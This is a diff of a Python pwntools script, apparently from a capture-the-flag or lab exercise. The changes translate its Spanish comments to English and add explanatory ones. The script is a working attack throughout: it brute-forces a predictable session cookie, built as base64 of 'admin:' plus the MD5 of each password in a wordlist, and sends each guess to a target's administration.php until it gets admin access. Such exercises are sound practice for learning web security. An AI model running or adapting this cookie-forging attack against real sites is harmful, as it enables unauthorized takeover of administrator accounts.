@@ -6,43 +6,52 @@
 from pwn import *
 import requests, signal, sys, hashlib, base64
 
-# Ctrl + C
+# Handler for Ctrl + C
 def def_handler(sig, frame):
     print("\n[+] Saliendo ...")
     sys.exit(1)
 
 signal.signal(signal.SIGINT, def_handler)
 
-# Variables Globales
-main_url = 'http://10.10.213.40/administration.php'
-passlist = 'passwords_list.txt' 
+# Global variables
+main_url = 'http://10.10.213.40/administration.php' # Target URL
+passlist = 'passwords_list.txt' # Passwords list file
 
+# Function to hijack the admin cookie
 def adminHijacking():
+    # Creating a progress bar
     p1 = log.progress("Admin session hijacking")
     p1.status("admin")
 
+    # Starting a session
     s = requests.Session()
+
+    # Opening the password list file and waiting 2 seconds
     f = open(passlist, "r")
     time.sleep(2)
 
+    # Iterating through each password in the password list file
     for password in f.readlines():
-        password = password.strip()
-        md5pass = hashlib.md5(password.encode()).hexdigest()
-        userPass = "admin:" + md5pass
-        cookie = base64.b64encode(userPass.encode()).decode()
+        password = password.strip() # Removing newline character
+        md5pass = hashlib.md5(password.encode()).hexdigest() # Convert password to MD5
+        userPass = "admin:" + md5pass # Concatenating "admin:" with the MD5 password
+        cookie = base64.b64encode(userPass.encode()).decode() # Encoding to base64
 
         r = s.get(main_url)
-        p1.status("admin : %s" % cookie)
-        
+        p1.status("admin : %s" % cookie) # Updating the progress bar status
+
+        # Here is the session hijacking attempt
         headers = {
             'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
             'Cookie': 'PHPSESSID=%s' % cookie
         }
 
+        # Sending the request with the hijacked cookie
         r = s.post(main_url, headers=headers)
 
+        # If the response does not contain the denial message, it means we have access to the admin panel
         if "Access denied, only the admin can access this page." not in r.text:
             p1.success("admin:%s" % cookie)
             break
 
-adminHijacking()
+adminHijacking() # Calling the function
